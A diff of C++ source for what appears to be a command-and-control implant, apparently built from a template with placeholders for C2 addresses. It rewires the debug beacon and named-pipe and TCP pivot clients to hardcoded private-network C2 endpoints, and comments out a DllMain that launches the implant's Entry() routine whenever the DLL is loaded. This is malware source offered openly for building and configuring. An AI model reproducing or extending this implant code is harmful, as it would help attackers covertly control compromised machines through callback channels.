@@ -537,7 +537,7 @@ int Entry() {
 #ifdef  PIVOT
 #ifdef SMBPIVOT
 #ifdef DEBUG
-    unique_ptr<IClient> cli = make_unique<NamedPipeClient>(string{ "\\\\192.168.161.30\\pipe\\pivotbar" });
+    unique_ptr<IClient> cli = make_unique<NamedPipeClient>(string{ "namedpipe://192.168.161.30/pipe/foobar" });
 #else
     // {{range $index, $value := .Config.C2}}                                                                                                                                                                                              
     unique_ptr<IClient> cli = make_unique<NamedPipeClient>(string{ "{{$value}}" });
@@ -546,7 +546,7 @@ int Entry() {
 #endif
 #ifdef TCPPIVOT
 #ifdef DEBUG
-    unique_ptr<IClient> cli = make_unique<TCPClient>(string{ "192.168.161.30:9005" });
+    unique_ptr<IClient> cli = make_unique<TCPClient>(string{ "tcppivot://192.168.161.30:9001" });
 #else
     // {{range $index, $value := .Config.C2}}                                                                                                                                                                                              
     unique_ptr<IClient> cli = make_unique<TCPClient>(string{ "{{$value}}" });
@@ -567,7 +567,7 @@ int Entry() {
 
     instanceID = uuids::to_string(uuids::uuid_system_generator{}());
 #ifdef DEBUG
-    shared_ptr<Beacon> beacon = make_shared<Beacon>("https://192.168.161.50", cli);
+    shared_ptr<Beacon> beacon = make_shared<Beacon>(string{ "namedpipe://192.168.161.30/pipe/foobar" }, cli);
 #else
     // {{range $index, $value := .Config.C2}}                                                                                                                                                                                              
     shared_ptr<Beacon> beacon = make_shared<Beacon>("{{$value}}", cli);
@@ -588,36 +588,36 @@ int main()
 }
 #endif
 
-#ifdef SHARED
-extern "C" {
-
-    BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
-    {
-        switch (fdwReason)
-        {
-        case DLL_PROCESS_ATTACH:
-        {
-            Entry();
-            break;
-        }
-        case DLL_PROCESS_DETACH:
-            Entry();
-            break;
-
-        case DLL_THREAD_ATTACH:
-            Entry();
-            break;
-
-        case DLL_THREAD_DETACH:
-            Entry();
-            break;
-        }
-
-        return TRUE;
-    }
-}
-
-#endif
+//#ifdef SHARED
+//extern "C" {
+//
+//    BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+//    {
+//        switch (fdwReason)
+//        {
+//        case DLL_PROCESS_ATTACH:
+//        {
+//            Entry();
+//            break;
+//        }
+//        case DLL_PROCESS_DETACH:
+//            Entry();
+//            break;
+//
+//        case DLL_THREAD_ATTACH:
+//            Entry();
+//            break;
+//
+//        case DLL_THREAD_DETACH:
+//            Entry();
+//            break;
+//        }
+//
+//        return TRUE;
+//    }
+//}
+//
+//#endif
 // Run program: Ctrl + F5 or Debug > Start Without Debugging menu
 // Debug program: F5 or Debug > Start Debugging menu
 
